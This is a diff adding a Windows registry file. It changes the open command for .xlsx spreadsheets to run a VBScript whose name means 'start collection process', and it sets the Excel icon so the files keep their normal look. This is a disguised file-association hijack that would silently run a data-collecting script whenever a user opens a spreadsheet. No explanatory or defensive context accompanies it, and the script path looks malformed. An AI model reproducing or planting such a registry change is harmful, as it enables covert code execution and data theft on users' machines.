@@ -1,0 +1,7 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CLASSES_ROOT\.xlsx\shell\open\command]
+@="wscript.exe \"%1\\启动收集进程.vbs\""
+
+[HKEY_CLASSES_ROOT\.xlsx\shell\open\command\DefaultIcon]
+@="excel.exe,0"
